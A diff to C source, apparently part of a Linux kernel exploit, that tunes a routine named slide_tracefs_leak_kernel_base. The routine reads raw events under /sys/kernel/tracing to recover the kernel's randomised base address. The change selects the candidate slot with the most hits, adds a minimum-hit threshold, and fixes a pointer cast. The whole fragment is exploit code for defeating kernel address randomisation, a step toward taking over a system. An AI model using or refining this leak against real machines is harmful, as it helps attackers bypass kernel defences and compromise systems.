@@ -201,6 +201,9 @@ static const uint64_t slide_max_offset = 0x3f8000ULL;
 #if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
 #define SLIDE_TRACEFS_CANDIDATES 128
+#ifndef SLIDE_TRACEFS_MIN_CALLER_HITS
+#define SLIDE_TRACEFS_MIN_CALLER_HITS 3
+#endif
 static unsigned int slide_tracefs_raw_pages;
 static unsigned int slide_tracefs_raw_bytes;
 static unsigned int slide_tracefs_raw_events;
@@ -608,22 +611,27 @@ static int slide_tracefs_leak_kernel_base(void) {
       scan_ok = 0;
     }
   }
+  unsigned int best_hits = 0;
   for (size_t slot = 0; slot < SLIDE_TRACEFS_CANDIDATES; slot++) {
     if (!slide_tracefs_candidate_hits[slot]) {
       continue;
     }
-    uintptr_t slot_candidate = slot << 15;
+    uintptr_t slot_candidate = (uintptr_t)slot << 15;
     pr_info("slide tracefs candidate=%08zx hits=%u\n",
             slot_candidate, slide_tracefs_candidate_hits[slot]);
-    candidate = slot_candidate;
+    if (slide_tracefs_candidate_hits[slot] > best_hits) {
+      best_hits = slide_tracefs_candidate_hits[slot];
+      candidate = slot_candidate;
+    }
     candidate_count++;
   }
-  pr_info("slide tracefs raw summary pages=%u bytes=%u events=%u callers=%u parse_fail=%u candidates=%d cpu_files=%d\n",
+  pr_info("slide tracefs raw summary pages=%u bytes=%u events=%u callers=%u parse_fail=%u candidates=%d best_hits=%u cpu_files=%d\n",
           slide_tracefs_raw_pages, slide_tracefs_raw_bytes,
           slide_tracefs_raw_events, slide_tracefs_raw_callers,
-          slide_tracefs_parse_failures, candidate_count, cpu_files);
+          slide_tracefs_parse_failures, candidate_count,
+          best_hits, cpu_files);
   if (!scan_ok || slide_tracefs_parse_failures || !cpu_files ||
-      candidate_count != 1) {
+      best_hits < SLIDE_TRACEFS_MIN_CALLER_HITS) {
     pr_warning("slide tracefs candidate gate failed\n");
     goto out;
   }
